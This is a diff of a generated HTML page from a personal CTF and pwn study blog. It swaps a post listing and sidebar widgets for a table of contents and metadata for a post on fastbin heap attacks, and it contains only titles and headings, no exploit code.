-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/27/pwn_uaf/"  itemprop="url">
-        uaf
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>ヽ(✿ﾟ▽ﾟ)ノ</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-27T08:00:00+08:00">2020-10-27</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/27/pwn_uaf/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
+  </article>
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/26/web_xss/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/26/web_xss/"  itemprop="url">
-        XSS
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>网络安全课作业需要，菜鸡被迫了解一下xss。</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-26T08:00:00+08:00">2020-10-26</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/WEB/">WEB</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/WEB/" itemprop="url"><span itemprop="name">WEB</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/26/web_xss/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/24/algorithm_review/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <div class='headimg-div'>
-      <a class='headimg-a' href="/2020/10/24/algorithm_review/">
-        <img itemprop="image" class='headimg' alt="Algorithm_review" src='https://i.loli.net/2020/11/16/DktlaEendNRYTij.png'/>
-      </a>
-    </div>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/24/algorithm_review/"  itemprop="url">
-        Algorithm_review
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>算法课复习~~</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-24T08:00:00+08:00">2020-10-24</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/Algorithm/">Algorithm</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/Algorithm/" itemprop="url"><span itemprop="name">Algorithm</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/24/algorithm_review/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/22/pwn_heap_data_structure/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/22/pwn_heap_data_structure/"  itemprop="url">
-        Heap Related Data Structure
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>好难啊</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-22T08:00:00+08:00">2020-10-22</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/22/pwn_heap_data_structure/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/20/nothing_memo/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/20/nothing_memo/"  itemprop="url">
-        x1ngg3's memo
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>我的备忘录，仅此而已</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-20T08:00:00+08:00">2020-10-20</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/NOTHING/">NOTHING</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/NOTHING/" itemprop="url"><span itemprop="name">NOTHING</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/20/nothing_memo/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/19/pwn_heap_overview/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/19/pwn_heap_overview/"  itemprop="url">
-        Heap Overview
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>heap~</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-19T08:00:00+08:00">2020-10-19</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/19/pwn_heap_overview/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/15/pwn_off-by-one/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/15/pwn_off-by-one/"  itemprop="url">
-        Off-by-one
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>(；′⌒&#96;)</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-15T08:00:00+08:00">2020-10-15</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/15/pwn_off-by-one/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-      <br>
-      <div class="prev-next">
-        
-        <p class="current">
-          1 / 3
-        </p>
-        
-          <a class="next" rel="next" href="/page/2/">
-            <section class="post next white-box shadow floatable blur">
-              &nbsp;Next&nbsp;<i class="fa-solid fa-chevron-right" aria-hidden="true"></i>
-            </section>
-          </a>
-        
-      </div>
-    
-  
 
 
 </div>
@@ -3206,169 +2798,31 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       
-<section class="widget blogger desktop mobile ">
-  <div class='content'>
     
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">x1ngg3's blog</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fa-solid fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fa-solid fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget category desktop">
-    
-  <header>
-    
-      <a href='/blog/categories/'><i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/Algorithm/" href="/categories/Algorithm/"
-            active-action="action-categoriesAlgorithm"
-            ><div class='name'>Algorithm</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/CRYPTO/" href="/categories/CRYPTO/"
-            active-action="action-categoriesCRYPTO"
-            ><div class='name'>CRYPTO</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/Contest/" href="/categories/Contest/"
-            active-action="action-categoriesContest"
-            ><div class='name'>Contest</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/LR/" href="/categories/LR/"
-            active-action="action-categoriesLR"
-            ><div class='name'>LR</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/NOTHING/" href="/categories/NOTHING/"
-            active-action="action-categoriesNOTHING"
-            ><div class='name'>NOTHING</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/PWN/" href="/categories/PWN/"
-            active-action="action-categoriesPWN"
-            ><div class='name'>PWN</div><div class='badge'>(9)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/RE/" href="/categories/RE/"
-            active-action="action-categoriesRE"
-            ><div class='name'>RE</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/WEB/" href="/categories/WEB/"
-            active-action="action-categoriesWEB"
-            ><div class='name'>WEB</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/test/" href="/categories/test/"
-            active-action="action-categoriestest"
-            ><div class='name'>test</div><div class='badge'>(1)</div></a></li>
-        
-      </ul>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget tagcloud desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fa-solid fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/Algorithm-review/" style="font-size: 14px; color: #999">Algorithm_review</a> <a href="/tags/CrackMe160/" style="font-size: 14px; color: #999">CrackMe160</a> <a href="/tags/House-Of-Spirit/" style="font-size: 14px; color: #999">House Of Spirit</a> <a href="/tags/SCTF/" style="font-size: 14px; color: #999">SCTF</a> <a href="/tags/WangDingCup-2020/" style="font-size: 14px; color: #999">WangDingCup_2020</a> <a href="/tags/XCTF-RE/" style="font-size: 14px; color: #999">XCTF_RE</a> <a href="/tags/buuoj-re/" style="font-size: 14px; color: #999">buuoj_re</a> <a href="/tags/chunk-extend/" style="font-size: 14px; color: #999">chunk_extend</a> <a href="/tags/crypto-buuoj/" style="font-size: 14px; color: #999">crypto_buuoj</a> <a href="/tags/heap/" style="font-size: 20.67px; color: #6c6c6c">heap</a> <a href="/tags/hook/" style="font-size: 14px; color: #999">hook</a> <a href="/tags/memo/" style="font-size: 14px; color: #999">memo</a> <a href="/tags/off-by-one/" style="font-size: 14px; color: #999">off_by_one</a> <a href="/tags/overlap/" style="font-size: 14px; color: #999">overlap</a> <a href="/tags/pwn/" style="font-size: 24px; color: #555">pwn</a> <a href="/tags/pwn-buuoj/" style="font-size: 14px; color: #999">pwn_buuoj</a> <a href="/tags/pwn-xctf/" style="font-size: 14px; color: #999">pwn_xctf</a> <a href="/tags/stackoverflow/" style="font-size: 14px; color: #999">stackoverflow</a> <a href="/tags/test/" style="font-size: 14px; color: #999">test</a> <a href="/tags/uaf/" style="font-size: 14px; color: #999">uaf</a> <a href="/tags/webweb/" style="font-size: 14px; color: #999">webweb</a> <a href="/tags/xss/" style="font-size: 14px; color: #999">xss</a> <a href="/tags/%E5%9B%BD%E8%B5%9B/" style="font-size: 14px; color: #999">国赛</a> <a href="/tags/%E6%97%A5%E6%9A%AE/" style="font-size: 14px; color: #999">日暮</a> <a href="/tags/%E6%A9%99%E9%9D%92/" style="font-size: 14px; color: #999">橙青</a> <a href="/tags/%E7%94%B5%E5%BD%B1%E6%84%9F/" style="font-size: 14px; color: #999">电影感</a> <a href="/tags/%E8%B0%83%E8%89%B2/" style="font-size: 17.33px; color: #828282">调色</a>
-    </div>
-  </section>
-
-
-    
-  
-
   
 
 
 <div class="widget-sticky">
+
+  
+  
+
+
+<section class="widget toc-wrapper desktop mobile" id="toc-div" >
+  
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastbin-Double-Free"><span class="toc-text">Fastbin Double Free</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-Of-Spirit"><span class="toc-text">House Of Spirit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#example-1"><span class="toc-text">example 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#example-2"><span class="toc-text">example 2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Alloc-to-Stack"><span class="toc-text">Alloc to Stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arbitrary-Alloc"><span class="toc-text">Arbitrary Alloc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2014-hack-lu-oreo"><span class="toc-text">2014 hack.lu oreo</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#add"><span class="toc-text">add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#show"><span class="toc-text">show</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#delete"><span class="toc-text">delete</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#leave-message"><span class="toc-text">leave_message</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#step1"><span class="toc-text">step1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step2"><span class="toc-text">step2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step3"><span class="toc-text">step3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step4"><span class="toc-text">step4</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Summary"><span class="toc-text">Summary</span></a></li></ol>
+  </div>
+</section>
+
+  
 
 </div>
 
@@ -3858,7 +3312,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"x1ngg3's blog"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"x1ngg3's blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"x1ngg3's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"x1ngg3's blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/PWN/","name":"PWN"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2020/11/01/pwn_fastbin-attack/","name":"Fastbin Attack related"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"x1ngg3's blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Fastbin Attack related","description":"我提莫的心态崩了啊 ಥ_ಥ","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2020/11/01/pwn_fastbin-attack/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"x1ngg3's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2020/11/01/pwn_fastbin-attack/","wordCount":13,"datePublished":"2020-10-31T16:00:00.000Z","dateModified":"2024-02-27T13:11:38.761Z","articleSection":"PWN","keywords":"pwn,heap,House Of Spirit","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
